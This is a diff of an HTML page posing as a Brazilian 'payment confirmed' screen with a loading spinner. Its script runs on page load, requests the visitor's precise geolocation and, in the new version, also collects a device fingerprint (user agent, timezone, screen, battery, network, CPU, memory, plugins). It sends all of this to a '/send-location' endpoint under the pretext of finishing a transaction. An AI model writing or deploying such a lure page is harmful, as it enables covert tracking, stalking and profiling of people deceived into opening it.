@@ -1,99 +1,102 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <title>Pagamento Confirmado</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 100px;
-            background: #f5f5f5;
-        }
-
-        h1 {
-            color: #4CAF50;
-            font-size: 2.5em;
-        }
-
-        p {
-            font-size: 1.2em;
-            color: #333;
-        }
-
-        .loader {
-            margin-top: 30px;
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #4CAF50;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        button {
-            padding: 12px 25px;
-            background-color: #4CAF50;
-            color: #f3f3f3;
-            border-radius: 50px;
-            border-color: #f3f3f300;
-            font-size: 1em;
-            margin-top: 20px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Pagamento Confirmado</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #f5f5f5; }
+    h1 { color: #4CAF50; font-size: 2.0em; }
+    p { font-size: 1.1em; color: #333; }
+    .loader { margin-top: 30px; border: 8px solid #f3f3f3; border-top: 8px solid #4CAF50; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; display: inline-block; }
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+  </style>
 </head>
-
 <body>
+  <h1>Pagamento confirmado ✅</h1>
+  <p>Estamos finalizando sua transação...</p>
+  <div class="loader"></div>
 
-    <h1>Pagamento confirmado ✅</h1>
-    <p>Estamos finalizando sua transação...</p>
-    <div class="loader"></div>
-
-    <script>
-        async function sendLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async function (pos) {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-
-                    try {
-                        await fetch('/send-location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ latitude: lat, longitude: lon })
-                        });
-                        console.log("Location sent successfully");
-                    } catch (err) {
-                        console.error("Failed to send location:", err);
-                    }
-                }, function (err) {
-                    console.warn("Geolocation error:", err);
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
-            } else {
-                console.warn("Geolocation not supported by this browser");
-            }
+  <script>
+    async function collectData() {
+      let batteryInfo = "N/A";
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? "charging" : "not charging"}`;
         }
+      } catch (_) {}
 
-        // Trigger location sending after page loads
-        window.onload = sendLocation;
-    </script>
+      let connection = "N/A";
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          const parts = [];
+          if (conn.effectiveType) parts.push(conn.effectiveType);
+          if (typeof conn.downlink === "number") parts.push(`downlink: ${conn.downlink}Mb/s`);
+          if (typeof conn.rtt === "number") parts.push(`rtt: ${conn.rtt}ms`);
+          connection = parts.join(", ");
+        }
+      } catch (_) {}
 
+      let plugins = [];
+      try {
+        if (navigator.plugins && navigator.plugins.length) {
+          for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+          }
+        }
+      } catch (_) {}
+
+      const data = {
+        latitude: null,
+        longitude: null,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenRes: `${screen.width}x${screen.height}`,
+        deviceRatio: window.devicePixelRatio || 1,
+        platform: navigator.platform,
+        battery: batteryInfo,
+        connection,
+        cpuCores: navigator.hardwareConcurrency || 0,
+        memoryGB: navigator.deviceMemory || 0,
+        cookies: !!navigator.cookieEnabled,
+        plugins: plugins.join(", "),
+        touchPoints: navigator.maxTouchPoints || 0
+      };
+
+      const send = () => sendData(data);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            data.latitude = pos.coords.latitude;
+            data.longitude = pos.coords.longitude;
+            send();
+          },
+          _err => { send(); },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        send();
+      }
+    }
+
+    async function sendData(payload) {
+      try {
+        console.log("Sending JSON:", payload);
+        const res = await fetch('/send-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        console.log('Server response:', res.status);
+      } catch (e) {
+        console.error("Error sending data", e);
+      }
+    }
+
+    window.onload = collectData;
+  </script>
 </body>
-
 </html>
